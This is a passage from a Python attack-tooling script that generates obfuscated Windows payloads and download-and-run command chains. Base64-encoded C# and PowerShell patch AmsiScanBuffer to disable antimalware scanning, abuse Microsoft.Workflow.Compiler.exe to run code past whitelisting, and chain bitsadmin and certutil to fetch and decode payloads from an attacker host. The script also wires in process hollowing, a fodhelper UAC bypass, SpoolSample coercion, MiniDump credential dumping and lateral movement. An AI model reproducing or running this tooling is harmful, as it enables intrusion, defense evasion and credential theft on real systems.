JvdGVjdChNaW1pUHRyLCAzLCAweDIwLCBvdXQgb2xkUHJvdGVjdCk7"
            #lower = "ICAgICAgICBzdHJpbmcgY29tbWFuZCA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKGRhdGEpOwoKICAgICAgICBSdW5zcGFjZSBycyA9IFJ1bnNwYWNlRmFjdG9yeS5DcmVhdGVSdW5zcGFjZSgpOwogICAgICAgIHJzLk9wZW4oKTsKICAgICAgICBQb3dlclNoZWxsIHBzID0gUG93ZXJTaGVsbC5DcmVhdGUoKTsKICAgICAgICBwcy5SdW5zcGFjZSA9IHJzOwogICAgICAgIHBzLkFkZFNjcmlwdChjb21tYW5kKTsKICAgICAgICBwcy5JbnZva2UoKTsKICAgICAgICBycy5DbG9zZSgpOwoKICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiSSBleGVjdXRlZCEiKTsKICAgIH0KfQ=="
            
            #test
            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWw7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlRocmVhZGluZzsKdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwp1c2luZyBTeXN0ZW0uTmV0Owp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgTWljcm9zb2Z0LldpbjMyOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlczsKcHVibGljIGNsYXNzIFJ1biA6IEFjdGl2aXR5ewoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnQzMiBkd1NpemUsIFVJbnQzMiBmbE5ld1Byb3RlY3QsIG91dCBVSW50MzIgbHBmbE9sZFByb3RlY3QpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgcHVibGljIFJ1bigpIHsKICAgICAgICAvL3dyZWNrIG1pbWkKICAgICAgICBzdHJpbmcgbmFtZTEgPSAiYSIgKyAibXNpIiArICIuZGxsIjsKICAgICAgICBzdHJpbmcgbmFtZTIgPSAiQSIgKyAibXNpIiArICJTY2FuQiIgKyAidWZmZXIiOwogICAgICAgIEludFB0ciBUYXJnZXRETEwgPSBMb2FkTGlicmFyeShuYW1lMSk7CiAgICAgICAgSW50UHRyIE1pbWlQdHIgPSBHZXRQcm9jQWRkcmVzcyhUYXJnZXRETEwsIG5hbWUyKTsKICAgICAgICBVSW50MzIgb2xkUHJvdGVjdCA9IDA7CiAgICAgICAgQnl0ZVtdIGJ1ZmkgPSB7IDB4NDgsIDB4MzEsIDB4QzAgfTsKICAgICAgICBWaXJ0dWFsUHJvdGVjdChNaW1pUHRyLCAzLCAweDQwLCBvdXQgb2xkUHJvdGVjdCk7CiAgICAgICAgTWFyc2hhbC5Db3B5KGJ1ZmksIDAsIE1pbWlQdHIsIGJ1ZmkuTGVuZ3RoKTsKICAgICAgICBWaXJ0dWFsUHJvdGVjdChNaW1pUHRyLCAzLCAweDIwLCBvdXQgb2xkUHJvdGVjdCk7"
            lower = "ICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiSSBleGVjdXRlZCEiKTsKICAgIH0KfQ=="

            amsi = "JGE9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTtGb3JFYWNoKCRiIGluICRhKSB7aWYgKCRiLk5hbWUgLWxpa2UgJyppVXRpbHMnKSB7JGM9JGJ9fTskZD0kYy5HZXRGaWVsZHMoJ05vblB1YmxpYyxTdGF0aWMnKTtGb3JFYWNoKCRlIGluICRkKSB7aWYgKCRlLk5hbWUgLWxpa2UgJypDb250ZXh0JykgeyRmPSRlfX07JGc9JGYuR2V0VmFsdWUoJG51bGwpO1tJbnRQdHJdJHB0cj0kZztbSW50MzJbXV0kYnVmPUAoMCk7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkYnVmLCAwLCAkcHRyLCAxKQ=="
            if pscmd[-4:] == ".ps1" or pscmd[-4:] == ".txt":
                if pscmd == "run.txt":
                    runner(lhost,lport,bitness)
                target, target_b64 = makeoneliner(pscmd)
            else:
                target = base64.b64decode(amsi).decode() + ";" + pscmd
            pass
            
            chars = chararray(target)
            chars = ", ".join(chars)

            base = "iex([System.Text.Encoding]::ASCII.GetString([char[]]@(%s)))"
            base = base % chars
            base_b64 = base64.b64encode(base.encode()).decode()
            #print(base)

            data = "byte[] data = Convert.FromBase64String(\"%s\");" % base_b64

            with open(compilefilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("        " + data + "\n")
                f.write(lower)
            f.close()
        '''
    compilecmd_upper = "JHdvcmtmbG93ZXhlID0gIkM6XFdpbmRvd3NcTWljcm9zb2Z0Lk5FVFxGcmFtZXdvcms2NFx2NC4wLjMwMzE5XE1pY3Jvc29mdC5Xb3JrZmxvdy5Db21waWxlci5leGUiCiR3b3JrZmxvd2FzbSA9IFtSZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZEZyb20oJHdvcmtmbG93ZXhlKQokU2VyaWFsaXplSW5wdXRUb1dyYXBwZXIgPSBbTWljcm9zb2Z0LldvcmtmbG93LkNvbXBpbGVyLkNvbXBpbGVyV3JhcHBlcl0uR2V0TWV0aG9kKCdTZXJpYWxpemVJbnB1dFRvV3JhcHBlcicsW1JlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXSAnTm9uUHVibGljLCBTdGF0aWMnKQpBZGQtVHlwZSAtUGF0aCAnQzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29yazY0XHY0LjAuMzAzMTlcU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLmRsbCcKJGNvbXBpbGVycGFyYW0gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBXb3JrZmxvdy5Db21wb25lbnRNb2RlbC5Db21waWxlci5Xb3JrZmxvd0NvbXBpbGVyUGFyYW1ldGVycwokY29tcGlsZXJwYXJhbS5HZW5lcmF0ZUluTWVtb3J5ID0gJFRydWU="
    compilecmd_lower = "JHRtcCA9ICRTZXJpYWxpemVJbnB1dFRvV3JhcHBlci5JbnZva2UoJG51bGwsQChbV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwuQ29tcGlsZXIuV29ya2Zsb3dDb21waWxlclBhcmFtZXRlcnNdICRjb21waWxlcnBhcmFtLFtTdHJpbmdbXV0gQCgsJHBhdGh2YXIpKSkKUmVtb3ZlLUl0ZW0gJG91dHB1dCAtZXJyb3JhY3Rpb24gJ3NpbGVudGx5Y29udGludWUnCk1vdmUtSXRlbSAkdG1wICRvdXRwdXQ="
    compilecmd_path = "$pathvar = \"%s\"\n" % compilepath
    compilecmd_out = "$output = \"%s\"\n" % compileout
    compilecmd = base64.b64decode(compilecmd_upper).decode() + "\n" + compilecmd_path + compilecmd_out + base64.b64decode(compilecmd_lower).decode()
    #print('[DEBUG] compiledcmd: %s' % compilecmd)
    compilecmd = "powershell -enc %s" % powershell_b64encode(compilecmd)

    compilecmd_check = "type %s | select-string generateinmemory\ntype %s | select-string d2p1:string" % (compileout,compileout)

    print('[+] compile txt written: %s' % compilefilename)
    copy(compilefilename,kalismbpath,compilefilename)
    input("[!] build %s as %s with below cmd (in powershell!):\n%s\n[+] check:\n%s\n[+] press enter to continue\n" % (compilefilename,runfilename,compilecmd,compilecmd_check))
    copy(kalicompileout,compilewebroot,runfilename)

    return runfilepath,runfilename
    pass

def makecompile(bitness,lhost,lport,ptype,binary,targethost,listenhost,pipename,pscmd):
    if binary == "Hollow":
        gen(lhost,lport,bitness,"csharp")
        if ptype == "remote":
            makehollow(bitness,lhost,lport)
            if obfuscate_bin == "1":
                copy("/var/www/html/Hollow.exe","/var/www/html/","Hollow.txt")

    if binary == "UACHelper":
        if ptype == "remote":
            makefodhelper(bitness,lhost,lport)
            if obfuscate_bin == "1":
                copy("/var/www/html/UACHelper.exe","/var/www/html/","UACHelper.txt")
        if ptype == "local":
            runner(lhost,lport,bitness)

    if binary == "SpoolSample":
        targetpipe = pipename.split("\\pipe\\spoolss")[0].split("\\\\.\\pipe\\")[1]
        listenpipe = "%s/pipe/%s" % (listenhost,targetpipe)
        if ptype == "remote":
            makespoolsample(targethost,listenpipe)
            if obfuscate_bin == "1":
                copy("/var/www/html/SpoolSample.exe","/var/www/html/","SpoolSample.txt")

    if binary == "PipePipe":
        print('[!] PipePipe doesn\'t integrate well with makecompile! use makerunspace! terminating!')
        sys.exit()
        '''
        if ptype == "remote":
            makepipepipe(bitness,lhost,lport,ptype,"0",pipename,targethost,listenhost,"0")
            if obfuscate_bin == "1":
                copy("/var/www/html/PipePipe.exe","/var/www/html/","PipePipe.txt")
        '''
    if binary == "MiniDump":
        if ptype == "remote":
            makeminidump(bitness,lhost)
            if obfuscate_bin == "1":
                copy("/var/www/html/MiniDump.exe","/var/www/html/","MiniDump.txt")

    bitsjobname = rand_word()
    randtxtname = "%s.txt" % rand_word()
    randxmlname = "%s.xml" % rand_word()
    runfilepath,runfilename = writecompile(bitness,lhost,lport,ptype,binary,targethost,listenhost,pipename,pscmd)
    runwebroot = "/var/www/html/"
    loadpath_met = "c:\\\\windows\\\\tasks\\\\%s"
    loadpath_cmd = loadpath_met.replace("\\\\","\\")
    utilpath = 'C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe %s %s'
    certutilcombo = "bitsadmin /Transfer myJob http://%s/%s %s && certutil -decode %s %s"
    if custom_agent == "0":
        certutilcombo_sub = "bitsadmin /Transfer %s http://%s/%s %s && del %s && certutil -decode %s %s"
    if custom_agent == "1":
        certutilcombo_sub = "bitsadmin /create /download %s && bitsadmin /setcustomheaders %s User-Agent:\"%s\" && bitsadmin /addFile %s http://%s/%s %s && bitsadmin /resume %s && ping 127.0.0.1 -n 10 > nul && bitsadmin /complete %s && del %s && certutil -decode %s %s"
    if proxy_steal == "1":
        certutilcombo_sub = "bitsadmin /util /setieproxy networkservice AUTODETECT && " + certutilcombo_sub

    resfilename = "%s.xml" % rand_word()
    resfilepath_met = loadpath_met % resfilename
    resfilepath_cmd = loadpath_cmd % resfilename

    certfilename = certutil_b64encode(runwebroot+runfilename)
    certfilepath_met = loadpath_met % randtxtname #certfilename
    certfilepath_cmd = loadpath_cmd % randtxtname #certfilename
    runfileroot = runwebroot + runfilename
    runfilepath_met = loadpath_met % randxmlname #runfilename
    runfilepath_cmd = loadpath_cmd % randxmlname #runfilename

    combo_one = certutilcombo % (lhost,certfilename,certfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "0":
        combo_one_sub = certutilcombo_sub % (bitsjobname,lhost,certfilename,certfilepath_cmd,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "1":
        combo_one_sub = certutilcombo_sub % (bitsjobname,bitsjobname,agent_string,bitsjobname,lhost,certfilename,certfilepath_cmd,bitsjobname,bitsjobname,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    combo_two = utilpath % (runfilepath_cmd,resfilepath_cmd)
    combo_break = combo_one + " && " + combo_two
    combo_break_sub = combo_one_sub + " && " + combo_two

    copy(certfilename,runwebroot,certfilename)
    print('[*] upload:\nupload %s %s' % (runfileroot,runfilepath_met)) 
    print(combo_one)
    print(combo_one_sub)
    print('[*] check:\ndir %s' % (runfilepath_cmd))
    print('[*] use:\n%s ' % (combo_two))
    print('[!] c-c-c-combo breaker (cmd only!) (sub):\n%s' % combo_break_sub)
    
    return combo_break,combo_break_sub
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--type','-t',required=True,dest='ptype',help='remote or local') #binary or direct
    parser.add_argument('--binname','-b',required=True,dest='binary',help='SharpUp, Hollow, or UACHelper') #, or Runspace')
    #parser.add_argument('--uac','-u',required=False,dest='uacbypass',help='uacbypass 0 or 1, only use with dll!')
    #parser.add_argument('--direct','-d',required=False,dest='direct',help='direct 0 or 1, only use with ps1!')
    parser.add_argument('--target','-n',required=False,dest='targethost',help='target hostname, e.g. rdc01') # default: [TARGETHOST]
    parser.add_argument('--hostname','-m',required=False,dest='listenhost',help='listening hostname, e.g. app01') # default: [LISTENHOST]
    parser.add_argument('--pipe','-s',required=False,dest='pipename',help='any arbitrary pipe name that targets \\pipe\\spoolss, e.g. \\\\.\\pipe\\test\\pipe\\spoolss') # default: \\\\.\\pipe\\test\\pipe\\spoolss
    
    # Runspace in makecompile failed - cannot compile with "using System.Management.Automation;" and "using System.Management.Automation.Runspaces;"
    parser.add_argument('--cmd','-c',required=False,dest='pscmd',help='arbitrary powershell command, only use with Runspace!')

    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    ptype = args.ptype
    binary = args.binary
    pscmd = args.pscmd
    targethost = args.targethost
    listenhost = args.listenhost
    pipename = args.pipename

    if pscmd == None: pscmd = "0"
    if binary == None: binary = "0"
    if targethost == None: targethost = "0"
    if listenhost == None: listenhost = "0"
    if pipename == None: pipename = "0"

    if binary == "Lat":
        if targethost == "0":
            print('[!] -n targethost must be provided if -b Lat is chosen! terminating!')
            sys.exit()
        if pipename == "0":
            pipename = "SensorService"
            print('[!] default service used: %s' % pipename)
        else:
            print('[+] targeted service: %s' % pipename)
        if pscmd == "0":
            print('[!] no pscmd/binary specified -> remote callback to run.txt will be used!')
        else:
            if "c:\\" not in pscmd:
                print('[!] provide full path! e.g. c:\\windows\\tasks\\bin.exe . terminating!')
                sys.exit()
            else:
                print('[!] local pre-compiled option chosen! make sure victim %s exists!' % pscmd)

    if binary == "PipePipe" or binary == "SpoolSample":
        if pipename == "0":
            pipename = "\\\\.\\pipe\\test\\pipe\\spoolss" # default pipename
            print('[!] default pipename used: %s' % pipename)

    if binary == "PipePipe":
        if targethost == "0":
            targethost = "[TARGETHOST]"
        if listenhost == "0":
            listenhost = "[LISTENHOST]"

    if binary == "SpoolSample":
        if targethost == "0" or listenhost == "0":
            print('[!] -n targethost and -m listenhost must be provided if -b SpoolSample is chosen! (e.g. -n rdc01 -m app01). terminating!')
            sys.exit()

    if binary != "0" and binary not in ("Hollow","UACHelper"):
        if binary == "SharpUp":
            if ptype != "remote":
                print('[!] SharpUp only compatible with pre-compiled binary! -t remote! terminating!')
                sys.exit()
            print('[!] make sure /var/www/html/%s.exe exists!' % binary)
            if obfuscate_bin == "1":
                copy("/var/www/html/SharpUp.exe","/var/www/html/","SharpUp.txt")
        else:
            print('[!] make sure /var/www/html/%s.exe exists!' % binary)

    # Runspace in makecompile failed - cannot compile with "using System.Management.Automation;" and "using System.Management.Automation.Runspaces;"
    '''
    if binary == "Runspace":
        if pscmd == None:
            print('[!] using Runspace means a pscmd must be provided! -c "pscmd"! terminating!')
            sys.exit()
        if ptype != "dir":
            print('[!] Runspace only compatible with direct injection! -t dir! terminating!')
            sys.exit()
    '''

    #writecompile(bitness,lhost,lport,ptype,binary,targethost,listenhost,pipename,pscmd)
    makecompile(bitness,lhost,lport,ptype,binary,targethost,listenhost,pipename,pscmd)